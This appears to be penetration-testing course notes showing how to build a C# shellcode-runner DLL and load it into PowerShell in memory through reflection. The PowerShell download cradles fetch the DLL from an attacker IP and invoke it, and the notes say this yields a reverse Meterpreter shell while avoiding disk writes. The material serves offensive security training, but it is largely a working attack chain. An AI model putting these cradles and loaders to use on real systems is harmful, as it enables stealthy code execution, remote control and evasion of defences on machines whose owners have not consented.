One of the issues when executing PowerShell in-memory was the use of Add-Type or the rather complicated use of reflection. While we proved that it is possible to call Win32 APIs and create a shellcode runner in PowerShell entirely in-memory, we can also do this by combining PowerShell and C#.

Using the Add-Type keyword made the .NET framework both compile and load the C# assembly into the PowerShell process. However, we can separate these steps, then fetch the pre-compiled assembly and load it directly into memory.

## Reflective Load

Open previously ConsoleApp1, right click on Solution > Add > New Project > ClassLibrary1 > Create
<img width="1804" height="900" alt="image" src="https://github.com/user-attachments/assets/a3003a57-8a18-4922-ba11-4e703494838d" />

The process of creating a managed EXE is similar to that of creating a managed DLL. In fact, we can begin by copying the contents of the Program class of the ConsoleApp1 project into the new Class1 class. We'll copy the DllImport statements as-is then create a runner method with the prefixes public, static, and void. This will serve as the body of the shellcode runner and must be available through reflection, which is why we declared it as public and static.

```
public class Class1
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
     uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public static void runner()
    {
    }
```
Copy also the main of ConsoleApp1 into runner() in ClassLibrary1
<img width="1888" height="611" alt="image" src="https://github.com/user-attachments/assets/c8b435cd-9ab1-4470-9f96-f8d2e70c6096" />

Compile and offer the file from Kali
In a new 64-bit session of PowerShell ISE on the Windows 10 development machine, we'll use a download cradle to fetch the newly-compiled DLL. As shown in Listing 40, we'll use the LoadFile method from the System.Reflection.Assembly namespace to dynamically load our pre-compiled C# assembly into the process. This works in both PowerShell and native C#.

```
(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/ClassLibrary1.dll', 'C:\Users\Offsec\ClassLibrary1.dll')

$assem = [System.Reflection.Assembly]::LoadFile("C:\Users\Offsec\ClassLibrary1.dll")
```

After the assembly is loaded, we can interact with it using reflection through the GetType and GetMethod methods, and finally call it through the Invoke method:

```
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

Executing this PowerShell results in a reverse Meterpreter shell, but it will download the assembly to disk before loading it. We can subvert this by instead using the Load[46] method, which accepts a Byte array in memory instead of a disk file. In this case, we'll modify our PowerShell code to use the DownloadDataddata method of the Net.WebClient class to download the DLL as a byte array.

```
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/ClassLibrary1.dll')

$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```
With this change, we have successfully loaded precompiled C# assembly directly into memory without touching disk and executed our shellcode runner. Excellent!





